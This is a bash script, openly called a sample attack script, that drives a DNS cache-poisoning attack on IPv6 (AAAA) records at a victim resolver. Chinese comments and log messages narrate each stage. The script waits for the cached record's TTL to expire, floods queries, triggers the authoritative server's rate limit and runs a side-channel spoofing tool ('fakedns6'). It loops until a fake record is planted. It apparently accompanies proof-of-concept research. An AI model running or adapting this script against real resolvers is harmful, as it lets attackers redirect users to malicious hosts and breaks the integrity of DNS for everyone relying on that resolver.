#!/bin/bash
# This is a sample attack script and may not work properly. Please adjust the parameter accordingly.
# $1 for victim resolver IP, $2 for attacker-controlled domain, $3 for iface name, $4 for victim domain name, $5 for victim domain nameserver IP
# Please run with sudo.

# Verify the existing record domain, just for proof purposes.
./output "PAYLOAD" "query response AAAA victim.ee64.fun AAAA <fake-record>" 
./output "INFO" "程序开始运行"

# echo '获取原记录中:'
# dig @$1 $4 AAAA
sleeptime=`dig @$1 $4 AAAA | grep -o -P '[0-9]+[ \t]*IN' | head -n 1 | sed 's/IN//g'`

var=0
num=0
success=0
while [ $success -ne 1 ]
do
  success=0
  # echo "等待缓存过期，$sleeptime秒之后开始攻击..."
  ./output "INFO" "等待缓存过期，$sleeptime秒之后开始攻击..."
  sleep $sleeptime
  # echo "开始攻击"
  ./output "INFO" "开始攻击"
  # flood
  # echo "攻击参数："
  # echo "目标域名权威服务地址:$5"
  # echo "目标解析服务地址:$1"
  # echo "目标域名:$4"
  ret=$(./dns_query.sh $1 $2 $3 $4)
  #echo "ret:$ret"
  # echo "初始化工具环境"
  sleep 1
  # echo "尝试触发权威服务器请求速率限制"
  sleep 3
  FINAL=`echo ${ret: -1}`
  #echo "fin:$FINAL"
  # Start attack
  # Change the argument accordingly
  # echo "执行侧信道攻击脚本中"
  ./fakedns6 -a $5 -b $1 -i $3 -n $4 -r $1 -t 50000 -at $2 -tg 0 -s 10000 -e 65000 -j 0
  sleep 30
  # Validations
  ((var++))
  # echo "第$var轮次攻击结束"
  ./output "INFO" "第$var轮次攻击结束"
  # dig @$1 $4 AAAA
  if [ "$FINAL" == "0" ];then
	success=1
	sleeptime=0
  fi
  # echo '如果结果未改变, 需要等待原缓存过期. 或者按 Ctrl-C取消攻击.'
done
# success
# echo '检测到攻击成功实现'
# echo '等待两秒，再次请求...'
# sleep 2
# dig @$1 $4 AAAA
# echo '攻击已完成！！！！'
./output "INFO" "程序结束运行"
sleep 10